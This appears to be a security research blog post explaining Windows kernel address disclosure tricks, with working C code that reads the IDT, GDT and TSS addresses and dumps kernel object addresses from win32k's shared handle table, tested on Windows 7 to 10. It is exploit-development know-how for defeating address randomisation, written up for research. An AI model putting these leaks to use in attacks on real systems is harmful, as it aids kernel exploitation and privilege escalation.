On x86 descriptor tables have various uses, the ones looked at in j00ru's paper were the Interrupt Descriptor Table (IDT), which allows the processor to lookup what code to execute to handle interrupts and exceptions, and the Global Descriptor Table (GDT) which is used by the processor to define [memory segments](https://en.wikipedia.org/wiki/X86_memory_segmentation).

More details on descriptor tables can be found in j00ru's paper however the key thing to note is that they play(/played) a key role in memory segmentation and privilege separation making them interesting values to access. The Global Descriptor Table Register (GDTR) defines the start address of the GDT and it's size, it can be read using the [sgdt](http://x86.renejeschke.de/html/file_module_x86_id_290.html) x86 instruction, a key note from instructions documentation is the following point:
<pre>
SGDT is only useful in operating-system software; however, it can be used in application programs without causing an exception to be generated.
</pre>
This means that code running in Ring 3 can read the GDTR value without causing an exception but cannot write to it. The format of the GDTR is as follows, taken from the [OSDEV wiki](http://wiki.osdev.org/Global_Descriptor_Table):
![](/content/images/2017/02/Gdtr.png)

The Interrupt Descriptor Table Register (IDTR) defines the start address of the IDT and its size, it can be read using the [sidt](http://x86.renejeschke.de/html/file_module_x86_id_295.html) x86 instruction and has the same 'handy' feature of been callable from ring 3 as sgdt does. The format for the IDTR I used is also taken from the [OSDEV wiki](http://wiki.osdev.org/IDT):
![](/content/images/2017/02/idtr.PNG)

Additionally Windows allows the reading of specific entries within the GDT using the [GetThreadSelectorEntry](https://msdn.microsoft.com/en-us/library/windows/desktop/ms679363(v=vs.85).aspx) function. In j00ru's paper he uses this to read several potentially sensitive table entries however I'll just use it to read the [Task State Segment](https://en.wikipedia.org/wiki/Task_state_segment) (TSS) descriptor.  

We can use inline assembly to execute the sidt instruction with a 6 byte buffer as an argument.
<pre>
unsigned char idtr[6] = { 0 };
__asm {
	sidt idtr;
}
</pre>
Once the idtr has been read, we just need to extract the values out of memory and print them.
<pre>
unsigned int idtrBase = (unsigned int)idtr[5] << 24 |
		(unsigned int)idtr[4] << 16 |
		(unsigned int)idtr[3] << 8 |
		(unsigned int)idtr[2];
unsigned short idtrLimit = (unsigned int)idtr[1] << 8 |
		(unsigned int)idtr[0];
printf("Interrupt Descriptor Table Register base: 0x%X, limit: 0x%X\r\n", idtrBase, idtrLimit);
</pre>
Again we can easily use inline assembly to call the sgdt instruction before extracting the base address and limit values :)
<pre>
unsigned char gdtr[6] = { 0 };
__asm {
	sgdt gdtr;
}
unsigned int gdtrBase = (unsigned int)gdtr[5] << 24 |
		(unsigned int)gdtr[4] << 16 |
		(unsigned int)gdtr[3] << 8 |
		(unsigned int)gdtr[2];
unsigned short gdtrLimit = (unsigned int)gdtr[1] << 8 |
		(unsigned int)gdtr[0];
printf("Global Descriptor Table Register base: 0x%X, limit: 0x%X\r\n", gdtrBase, gdtrLimit);
</pre>
Next we want to use GetThreadSelectorEntry to read the TSS entry. MSDN described the function as follows.

<pre>
BOOL WINAPI GetThreadSelectorEntry(
  _In_  HANDLE      hThread,
  _In_  DWORD       dwSelector,
  _Out_ LPLDT_ENTRY lpSelectorEntry
);
</pre>

First all we use the [Store Task Register/str](http://x86.renejeschke.de/html/file_module_x86_id_307.html) instruction to get the correct segment selector for the tss.
<pre>
WORD tr;

__asm str tr
</pre>
Next we create an empty [LDT_ENTRY](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680348(v=vs.85).aspx) entry structure and call the GetThreadSelectorEntry function with the current thread passed as the thread parameter. 
<pre>
LDT_ENTRY tss;
GetThreadSelectorEntry(GetCurrentThread(), tr, &tss);
</pre>
We can then read the TSS's base address and limit from the now populated LDT_ENTRY structure as below.
<pre>
unsigned int  tssBase = (tss.HighWord.Bits.BaseHi << 24) +
	(tss.HighWord.Bits.BaseMid << 16) +
	tss.BaseLow;
unsigned int tssLimit = tss.LimitLow;
printf("TSS base: 0x%X, limit: 0x%X\r\n", tssBase, tssLimit);
</pre>
With all of this done, we can compile the code and run it to see the addresses:
![](/content/images/2017/02/descriptor_tables_win_7_32.PNG)

The full code including the changes for 64 bit Windows can be grabbed from [Github](https://github.com/sam-b/windows_kernel_address_leaks/tree/master/DescriptorTables).
## #Windows 8 64 bit onward
Some non-trivial changes had to be made to the code to get it to work on 64 bit Windows. Most significantly Visual Studio doesn't support inline assembly for projects targeting amd64. Luckily for sidt/sgdt we can get around this by using some of the [Compiler Intrinsics](https://msdn.microsoft.com/en-us/library/26td21ds.aspx) defined by Visual Studio. Reading the GDTR was replaced with the following code.

<pre>
unsigned char gdtr[10] = { 0 };
_sgdt(gdtr);
unsigned long long gdtrBase = (unsigned long long)gdtr[9] << 56 |
	(unsigned long long)gdtr[8] << 48 |
	(unsigned long long)gdtr[7] << 40 |
	(unsigned long long)gdtr[6] << 32 |
	(unsigned long long)gdtr[5] << 24 |
	(unsigned long long)gdtr[4] << 16 |
	(unsigned long long)gdtr[3] << 8 |
	(unsigned long long)gdtr[2];
unsigned short gdtrLimit = (unsigned int)gdtr[1] << 8 |
	(unsigned int)gdtr[0];
printf("Global Descriptor Table Register base: 0x%llx, limit: 0x%X\r\n", gdtrBase, gdtrLimit);
</pre>

The _sgdt intrinsic works identically to calling sgdt with inline assembly. The size of gdtr also had to be updated to reflect the larger pointers on 64 bit systems. The same changes needed to be made for reading the IDTR as well.
<pre>
unsigned char idtr[10] = { 0 };
__sidt(idtr); 
unsigned long long idtrBase = (unsigned long long)idtr[9] << 56 |
	(unsigned long long)idtr[8] << 48 |
	(unsigned long long)idtr[7] << 40 |
	(unsigned long long)idtr[6] << 32 |
	(unsigned long long)idtr[5] << 24 |
	(unsigned long long)idtr[4] << 16 |
	(unsigned long long)idtr[3] << 8 |
	(unsigned long long)idtr[2];
unsigned short idtrLimit = (unsigned int)idtr[1] << 8 |
	(unsigned int)idtr[0];
printf("Interrupt Descriptor Table Register base: 0x%llx, limit: 0x%X\r\n", idtrBase, idtrLimit);
</pre>

Finally intrin.h needs to be added to the includes as that's where the Compiler Intrinsics are defined.
<pre>
#include &lt;intrin.h>
</pre>
GetThreadSelectorEntry doesn't seem to have a straight 64 bit implementation reading the TSS was abandoned for this.

Since the sidt/sgdt instructions being executable from Ring 3 is a feature of the amd64 instruction set as opposed to an operating system feature, these value are still readable in Windows 8:
![](/content/images/2017/02/descriptor_tables_win_8_64-1.PNG)
Windows 8.1:
![](/content/images/2017/02/descriptor_tables_win_8_1_64-1.PNG)
And finally Windows 10:
![](/content/images/2017/02/descriptor_tables_win_10_64-1.PNG)
Regardless of the integrity level the process is run at or what permissions the user has. 
## #Hyper-V
According to Dave Weston and Matt Miller's [Black Hat presentation](https://www.blackhat.com/docs/us-16/materials/us-16-Weston-Windows-10-Mitigation-Improvements.pdf) on Windows 10's exploit mitigation improvements, if Hyper-V is enabled on a system and the sidt or sgdt instructions are executed the hypervisor will trap on them and stop the values being returned. 

![](/content/images/2017/02/weston_blackhat_gdt_idt_hyperv_mitigation-2.PNG)

I didn't have a machine I could test this on though.

## Win32k.sys Object Handle Addresses
## #Windows 7 32 bit
Win32k is the main driver responsible for providing the functionality to output graphics to monitors, printers, etc on Windows. It maintains a per session ([A session consists of all of the processes and other system objects that represent a single user’s logon session.](https://blogs.technet.microsoft.com/askperf/2007/07/24/sessions-desktops-and-windows-stations/)) Handle table which stores all [GDI (Graphics Device Interface) and User Handles](https://blogs.technet.microsoft.com/markrussinovich/2010/02/24/pushing-the-limits-of-windows-user-and-gdi-objects-part-1/). 

In order to reduce the performance overhead of accessing this table it is mapped into all GUI processes in user space. The address of this table in user space is exported as gSharedInfo by user32.dll. 

This allows the addresses of all GDI and User objects in kernel memory to be discovered from user mode. First of all we need to define the structures of what this table looks like in memory, the following structures where taken and then abused from [ReactOS](https://www.reactos.org/wiki/Techwiki:Win32k/SHAREDINFO).

<pre>
typedef struct _HANDLEENTRY {
	PVOID	phead;
	ULONG	pOwner;
	BYTE	bType;
	BYTE	bFlags;
	WORD	wUniq;
}HANDLEENTRY, *PHANDLEENTRY;

typedef struct _SERVERINFO {
	DWORD	dwSRVIFlags;
	DWORD	cHandleEntries;
	WORD	wSRVIFlags;
	WORD	wRIPPID;
	WORD	wRIPError;
}SERVERINFO, *PSERVERINFO;

typedef struct _SHAREDINFO {
	PSERVERINFO	psi;
	PHANDLEENTRY	aheList;
	ULONG		HeEntrySize; 
	ULONG_PTR	pDispInfo;
	ULONG_PTR	ulSharedDelta;
	ULONG_PTR	awmControl; 
	ULONG_PTR	DefWindowMsgs; 
	ULONG_PTR	DefWindowSpecMsgs; 
}SHAREDINFO, *PSHAREDINFO;
</pre>
Next we need to get a handle to the user32 DLL and find the offset of the gSharedInfo variable.
<pre>
HMODULE hUser32 = LoadLibraryA("user32.dll");
PSHAREDINFO gSharedInfo = (PSHAREDINFO)GetProcAddress(hUser32, "gSharedInfo");
</pre>
Once the tables location in user space has been resolved we can just iterate over the handle table printing the kernel address of each object, its owner and the objects type.
<pre>
for (unsigned int i = 0; i < gSharedInfo->psi->cHandleEntries; i++) {
	HANDLEENTRY entry = gSharedInfo->aheList[i];
	if (entry.bType != 0) { //ignore free entries
		printf("Head: 0x%X, Owner: 0x%X, Type: 0x%X\r\n", entry.phead, entry.pOwner, entry.bType);
	}
}
</pre>
Here it is running on a Windows 7 32 bit machine:
![](/content/images/2017/02/SharedInfoHandleTable_info_leak_poc.PNG)
[](https://github.com/sam-b/windows_kernel_address_leaks/tree/master/SharedInfoHandleTable)
## #Windows 8/8.1 64 bits
A couple of minor changes were needed to port the code to 64 bits. First of all the SERVERINFO struct was expanded by 64 bits, adjusting the sizes of the dwSRVIFlags and cHandleEntries fields seemed to bring everything inline with how it looked before.
<pre>
typedef struct _SERVERINFO {
#ifdef _WIN64
	UINT64 dwSRVIFlags;
	UINT64 cHandleEntries;
#else
	DWORD dwSRVIFlags;
	DWORD cHandleEntries;
#endif
</pre>
As usual the printf statements which logged addresses also needed modifying to handle 64 bit pointers.
<pre>
#ifdef _WIN64
	printf("Head: 0x%llx, Owner: 0x%llx, Type: 0x%X\r\n", entry.phead, entry.pOwner, entry.bType);
#else
	printf("Head: 0x%X, Owner: 0x%X, Type: 0x%X\r\n", entry.phead, entry.pOwner, entry.bType);
#endif
</pre>
With these changes made, it ran successfully on Windows 8.1 :)
![](/content/images/2017/02/shared_handle_table_windows_8_1_64bit_low_integrity.PNG)

## #Windows 10?
In Dave Weston and Matt Miller's [Black Hat USA talk](https://www.blackhat.com/docs/us-16/materials/us-16-Weston-Windows-10-Mitigation-Improvements.pdf) they state that the GDI shared handle table no longer discloses kernel addresses.
![](/content/images/2017/02/weston_blackhat_gdi_table-1.PNG) 
However when the binary is ran in a Windows 10 64 bit anniversary edition virtual machine, I got what looks a lot like kernel pointers:
![](/content/images/2017/02/shared_handle_table_windows_10_64bit_low_integrity.PNG)
Looking at the disclosed addresses they are in the right value range to match the expected session space address range in kernel memory, at least the range that was present in Windows 7 64 bit as described by [Code Machine](http://www.codemachine.com/article_x64kvas.html) (I couldn't find an equivalent map for Windows 10).

![](/content/images/2017/02/session_space_64bit-1.PNG)

Next up I loaded up a windows 8 64 bit machine with a kernel debugger attached and dumped the handle table and compared it to what I could see using the debugger. A few of the matching values are highlighter below but all the expected values from the user mode code are present.
![](/content/images/2017/02/shared_handle_table_debugging_win8_user_pointer.PNG)

I then did the same for the Windows 10 64 bit virtual machine I had been using.

![](/content/images/2017/02/shared_handle_table_debugging_win10-1.PNG)

I found that the structure of the Handle table and the values pointed at, where very much consistent with each other between the OS versions. I don't currently have more time to dig into this and it's likely me being confused (which isn't hard...), so I'm leaving it as a question mark for now.